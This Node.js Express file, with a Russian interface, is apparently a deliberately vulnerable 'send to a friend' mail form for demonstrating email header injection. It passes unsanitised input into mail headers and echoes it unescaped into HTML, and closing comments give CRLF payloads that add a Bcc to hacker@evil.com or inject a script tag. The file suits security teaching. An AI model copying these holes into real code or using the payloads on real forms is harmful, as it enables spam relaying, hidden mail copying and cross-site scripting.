const express = require('express');
const nodemailer = require('nodemailer');
const app = express();
const port = 3000;

app.use(express.urlencoded({ extended: true }));

const transporter = nodemailer.createTransport({
    host: 'smtp.example.com',
    port: 587,
    secure: false,
    auth: { user: 'demo@example.com', pass: 'password' }
});

app.get('/', (req, res) => {
    res.send(`
        <h1>Отправить другу</h1>
        <form action="/send" method="POST">
            <label>Ваш email:</label><br>
            <input name="fromEmail" placeholder="your@example.com" required><br><br>
            
            <label>Email друга:</label><br>
            <input name="toEmail" placeholder="friend@example.com" required><br><br>
            
            <label>Тема:</label><br>
            <input name="subject" placeholder="Интересная статья" required><br><br>
            
            <label>Сообщение:</label><br>
            <textarea name="message" placeholder="Привет! Посмотри эту статью..." required></textarea><br><br>
            
            <button type="submit">Отправить</button>
        </form>
    `);
});

app.post('/send', (req, res) => {
    const { fromEmail, toEmail, subject, message } = req.body;
    const mailOptions = {
        from: fromEmail, 
        to: toEmail,         
        subject: subject,     
        text: message
    };
    console.log('=== ОТПРАВКА EMAIL ===');
    console.log('From:', mailOptions.from);
    console.log('To:', mailOptions.to);
    console.log('Subject:', mailOptions.subject);
    console.log('=====================');
    
    res.send(`
        <h1>Email отправлен!</h1>
        <p>From: ${mailOptions.from}</p>
        <p>To: ${mailOptions.to}</p>
        <p>Subject: ${mailOptions.subject}</p>
        <a href="/">Назад</a>
    `);
});

app.listen(port, () => {
    console.log(`Уязвимый сервер: http://localhost:${port}`);
});

// friend@example.com%0ABcc:hacker@evil.com%0ABcc:victim1@example.com
// Статья%0AContent-Type:text/html%0A%0A<script>alert(1)</script>